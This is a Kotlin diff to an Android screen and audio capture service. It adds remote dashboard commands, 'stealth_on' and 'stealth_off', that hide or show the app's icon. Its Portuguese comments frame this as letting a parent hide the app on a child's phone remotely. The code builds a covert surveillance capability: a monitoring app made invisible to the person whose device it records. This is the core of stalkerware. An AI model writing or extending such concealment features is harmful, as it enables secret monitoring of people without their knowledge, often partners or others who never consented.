@@ -145,6 +145,20 @@ class CaptureService : Service() {
                 when (message.command) {
                     "audio_start" -> startAudioCapture(message.source ?: "playback")
                     "audio_stop" -> stopAudioCapture()
+                    "stealth_on" -> {
+                        // Comando remoto do dashboard: esconder ícone da app.
+                        // O pai pode activar o modo oculto sem tocar no telemóvel da criança.
+                        val app = applicationContext as ScreenPorterApp
+                        if (app.stealth.hide()) {
+                            Log.i(TAG, "Stealth activado remotamente via dashboard")
+                        }
+                    }
+                    "stealth_off" -> {
+                        val app = applicationContext as ScreenPorterApp
+                        if (app.stealth.show()) {
+                            Log.i(TAG, "Stealth desactivado remotamente via dashboard")
+                        }
+                    }
                     else -> ControlAccessibilityService.instance?.handleControl(message)
                 }
             }
